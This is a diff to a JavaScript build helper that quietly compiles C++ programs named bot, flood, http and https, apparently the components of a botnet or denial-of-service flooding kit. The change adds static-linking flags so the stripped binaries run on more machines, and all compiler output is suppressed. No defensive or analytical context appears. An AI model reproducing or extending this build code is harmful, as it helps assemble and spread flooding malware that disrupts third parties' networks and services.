@@ -114,11 +114,11 @@ function tryNativeCompilation(targetDir) {
 
     const sslFlag = hasSsl ? '-lssl -lcrypto' : '-DNO_SSL';
     try {
-        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -o bot bot.cpp`, { cwd: targetDir, stdio: 'ignore' });
-        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o flood flood.cpp ${sslFlag}`, { cwd: targetDir, stdio: 'ignore' });
-        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o http http.cpp`, { cwd: targetDir, stdio: 'ignore' });
+        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -static-libstdc++ -static-libgcc -o bot bot.cpp`, { cwd: targetDir, stdio: 'ignore' });
+        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o flood flood.cpp ${sslFlag}`, { cwd: targetDir, stdio: 'ignore' });
+        execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o http http.cpp`, { cwd: targetDir, stdio: 'ignore' });
         if (hasSsl) {
-            execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -o https https.cpp -lssl -lcrypto`, { cwd: targetDir, stdio: 'ignore' });
+            execSync(`${compiler} -Os -s -fno-exceptions -fno-rtti -pthread -static-libstdc++ -static-libgcc -o https https.cpp -lssl -lcrypto`, { cwd: targetDir, stdio: 'ignore' });
         }
         return true;
     } catch (err) {
